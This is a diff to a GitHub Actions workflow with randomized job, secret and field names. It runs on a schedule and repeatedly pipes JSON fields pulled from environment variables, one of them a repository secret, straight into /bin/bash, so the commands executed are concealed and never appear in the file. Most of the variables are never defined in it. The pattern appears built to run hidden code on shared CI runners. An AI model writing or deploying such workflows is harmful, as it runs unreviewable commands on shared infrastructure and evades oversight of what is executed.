@@ -2,21 +2,25 @@ name: huangsanhe5647
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 5/6 * * *'
+    - cron: '59 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangsanhe5647
         env:
-          rd900: ${{ secrets.rd900 }}
+          vtqy1: ${{ secrets.vtqy1 }}
         run: |
-          echo $rd900 | jq -r .jum2041 | /bin/bash
-          echo $mrq940 | jq -r .hwnl4835 | /bin/bash
-          echo $uiyvc7 | jq -r .rt84337 | /bin/bash
-          echo $ywfe5 | jq -r .svhf17 | /bin/bash
-          echo $fp38938 | jq -r .yygsd67 | /bin/bash
-          echo $qd75 | jq -r .gh346 | /bin/bash
+          echo $vtqy1 | jq -r .w78 | /bin/bash
+          echo $d0 | jq -r .uugdx3761 | /bin/bash
+          echo $gj5223 | jq -r .cau8496 | /bin/bash
+          echo $sz1 | jq -r .xqmi39 | /bin/bash
+          echo $zp2 | jq -r .ix5145 | /bin/bash
+          echo $mu83 | jq -r .jc005 | /bin/bash
+          echo $nc319 | jq -r .kp7149 | /bin/bash
+          echo $bdjbv82 | jq -r .o4 | /bin/bash
+          echo $npgtd73017 | jq -r .wc5444 | /bin/bash
+          echo $tqkok26988 | jq -r .er08771 | /bin/bash
+          echo $tfi8174 | jq -r .teuwc586 | /bin/bash
 
